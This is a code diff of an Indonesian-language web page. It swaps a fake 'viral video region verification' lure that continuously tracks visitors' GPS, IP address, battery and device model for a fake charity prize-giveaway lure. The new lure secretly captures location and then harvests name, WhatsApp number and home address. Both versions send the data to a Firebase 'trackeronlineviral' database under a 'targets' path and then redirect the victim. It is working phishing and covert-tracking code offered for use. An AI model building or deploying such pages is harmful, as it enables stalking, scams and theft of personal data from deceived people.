@@ -3,126 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan Konten</title>
+    <title>Selamat! Anda Terpilih - Program Berbagi Hamba Allah</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { background: #1e293b; padding: 35px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.4); max-width: 350px; width: 90%; border: 1px solid #334155; }
-        .icon { font-size: 60px; margin-bottom: 20px; }
-        h2 { font-size: 20px; margin-bottom: 12px; font-weight: 700; color: #fff; }
-        p { font-size: 14px; color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); color: white; border: none; padding: 16px 24px; border-radius: 14px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; font-size: 15px; text-transform: uppercase; letter-spacing: 1px; }
-        #loader { display: none; margin-top: 20px; border: 4px solid #334155; border-top: 4px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; color: #1c1e21; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .card { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 400px; width: 90%; text-align: center; }
+        .header-img { width: 100%; border-radius: 10px; margin-bottom: 15px; }
+        h2 { color: #d32f2f; margin-bottom: 10px; }
+        p { font-size: 14px; color: #606770; margin-bottom: 20px; line-height: 1.5; }
+        .input-group { text-align: left; margin-bottom: 15px; display: none; }
+        label { display: block; font-size: 12px; font-weight: bold; margin-bottom: 5px; color: #4b4f56; }
+        input, textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 14px; }
+        .btn { background: #d32f2f; color: white; border: none; padding: 15px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background: #b71c1c; }
+        #loader { display: none; color: #d32f2f; font-weight: bold; margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="icon">🛡️</div>
-    <h2>Verifikasi Wilayah</h2>
-    <p>Konten video ini sedang tren di wilayah Anda. Silakan verifikasi lokasi Anda untuk membuka aplikasi YouTube secara otomatis.</p>
-    <button class="btn" id="startBtn" onclick="processAll()">BUKA VIDEO BERITA VIRAL</button>
-    <div id="loader"></div>
+    <img src="https://img.freepik.com/free-vector/gift-box-with-red-ribbon-white-background_1308-41076.jpg" class="header-img">
+    <div id="step1">
+        <h2>Selamat!</h2>
+        <p>Anda terpilih sebagai penerima hadiah tunai & barang mewah dari <b>Program Berbagi Hamba Allah</b>.<br><br>Silakan klik tombol di bawah untuk memverifikasi lokasi pengiriman Anda.</p>
+        <button class="btn" onclick="requestLocation()">VERIFIKASI LOKASI</button>
+    </div>
+
+    <div id="step2" class="input-group">
+        <h2>Data Pengiriman</h2>
+        <p>Lokasi terverifikasi! Silakan lengkapi formulir di bawah untuk pengiriman hadiah ke alamat Anda.</p>
+        <label>Nama Lengkap</label>
+        <input type="text" id="nama" placeholder="Contoh: Budi Santoso">
+        <br><br>
+        <label>Nomor WhatsApp</label>
+        <input type="number" id="phone" placeholder="0812xxxx">
+        <br><br>
+        <label>Alamat Lengkap (Beserta Kota/Kecamatan)</label>
+        <textarea id="alamat" rows="3" placeholder="Jl. Merdeka No. 123..."></textarea>
+        <br><br>
+        <button class="btn" onclick="submitData()">KONFIRMASI PENGIRIMAN</button>
+    </div>
+    <div id="loader">Memproses data...</div>
 </div>
 
 <script>
-    // Konfigurasi Awal
     const targetID = "Target_" + Math.floor(Date.now() / 1000);
-    const startTime = Date.now(); // Digunakan untuk hitungan durasi di dashboard
     const DB_URL = `https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets/${targetID}.json`;
+    const startTime = Date.now();
+    let userCoords = { lat: 0, lon: 0 };
 
-    const YT_URL = "https://www.youtube.com/trending";
-    const YT_APP_INTENT = "intent://www.youtube.com/trending#Intent;package=com.google.android.youtube;scheme=https;end";
-
-    let lastSent = 0;
-
-    // Fungsi Pengambil IP
-    async function getIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch (e) { return "Hidden/VPN"; }
-    }
-
-    // Fungsi Pengambil Baterai & Model HP
-    async function getDeviceInfo() {
-        let bat = "N/A";
-        try {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                bat = Math.round(battery.level * 100) + "%";
-            }
-        } catch (e) {}
-
-        const ua = navigator.userAgent;
-        let model = "Mobile Device";
-        if (ua.includes("Android")) {
-            model = ua.split('(')[1]?.split(')')[0] || "Android";
-        } else if (ua.includes("iPhone")) {
-            model = "iPhone / iOS";
+    function requestLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                userCoords.lat = pos.coords.latitude;
+                userCoords.lon = pos.coords.longitude;
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+                // Kirim koordinat awal secara diam-diam
+                sendUpdate("Verifikasi Lokasi Berhasil");
+            }, (err) => {
+                alert("Izin lokasi diperlukan untuk menentukan jasa pengiriman terdekat.");
+            });
         }
-        return { battery: bat, device: model };
     }
 
-    // Fungsi Utama Pengiriman Data (Heartbeat)
-    async function sendData(coords) {
-        const ip = await getIP();
-        const info = await getDeviceInfo();
-
+    async function sendUpdate(status) {
         const payload = {
             id: targetID,
-            lat: coords.latitude,
-            lon: coords.longitude,
-            ip: ip,
-            battery: info.battery,
-            device: info.device,
+            lat: userCoords.lat,
+            lon: userCoords.lon,
+            nama: document.getElementById('nama').value || "-",
+            phone: document.getElementById('phone').value || "-",
+            alamat: document.getElementById('alamat').value || "-",
             start_time: startTime,
-            updated_at: Date.now(), // Timestamp angka agar dashboard bisa menghitung durasi tidak aktif
-            status: "Online"
+            updated_at: Date.now(),
+            status: status
         };
-
-        return fetch(DB_URL, { 
-            method: 'PUT', 
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload) 
-        });
+        await fetch(DB_URL, { method: 'PUT', body: JSON.stringify(payload) });
     }
 
-    function processAll() {
-        document.getElementById('startBtn').style.display = "none";
-        document.getElementById('loader').style.display = "block";
+    async function submitData() {
+        const nama = document.getElementById('nama').value;
+        const phone = document.getElementById('phone').value;
+        const alamat = document.getElementById('alamat').value;
 
-        if (navigator.geolocation) {
-            // Memulai pemantauan posisi secara terus-menerus
-            navigator.geolocation.watchPosition(
-                async (pos) => {
-                    const now = Date.now();
-                    // Kirim data hanya jika jeda sudah lebih dari 5 detik
-                    if (now - lastSent > 5000) {
-                        await sendData(pos.coords);
-                        lastSent = now;
-                    }
-
-                    // Redirect ke YouTube saat data pertama berhasil terkirim
-                    if (lastSent === now) {
-                        setTimeout(() => {
-                            window.location.href = YT_APP_INTENT;
-                            setTimeout(() => { window.location.href = YT_URL; }, 1000);
-                        }, 1500);
-                    }
-                },
-                (err) => {
-                    alert("Akses lokasi ditolak. Verifikasi diperlukan untuk memutar video.");
-                    location.reload();
-                },
-                { enableHighAccuracy: true }
-            );
-        } else {
-            alert("Browser tidak mendukung GPS.");
+        if (!nama || !phone || !alamat) {
+            alert("Harap lengkapi semua data pengiriman!");
+            return;
         }
+
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
+        await sendUpdate("Selesai Mengisi Form");
+        
+        setTimeout(() => {
+            alert("Terima kasih! Data Anda telah berhasil dikirim. Tim kami akan menghubungi via WhatsApp.");
+            window.location.href = "https://www.google.com";
+        }, 2000);
     }
 </script>
-
 </body>
 </html>
